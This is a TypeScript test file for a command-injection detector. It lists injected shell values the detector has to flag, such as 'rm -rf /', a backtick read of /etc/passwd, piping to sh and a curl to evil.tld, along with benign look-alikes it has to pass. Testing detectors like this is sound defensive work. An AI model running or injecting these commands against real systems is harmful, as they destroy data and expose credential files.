import { describe, expect, it } from "bun:test";
import { defaultLimits } from "../traversal/limits";
import { commandInjectionWall } from "./command-injection";
import type { DetectorContext } from "../detector";

const ctx: DetectorContext = { surface: "query", path: "query.name", limits: defaultLimits };

describe("commandInjectionWall", () => {
  it("should be a high-severity value wall", () => {
    expect(commandInjectionWall.id).toBe("command-injection");
    expect(commandInjectionWall.severity).toBe("high");
  });

  it.each([
    "report.pdf; rm -rf /",
    "$(whoami)",
    "file `cat /etc/passwd`",
    "input | sh",
    "x && curl http://evil.tld",
    "log > /dev/null",
    "/etc/passwd",
  ])("should flag the value when it is %j", (value) => {
    expect(commandInjectionWall.test(value, ctx)).toBe(true);
  });

  it.each([
    "Tom & Jerry",
    "salt and pepper; sugar too",
    "cost is $100 (net)",
    "a | b",
    "/etc/hosts entry",
    "",
  ])("should pass the value when it is %j", (value) => {
    expect(commandInjectionWall.test(value, ctx)).toBe(false);
  });
});
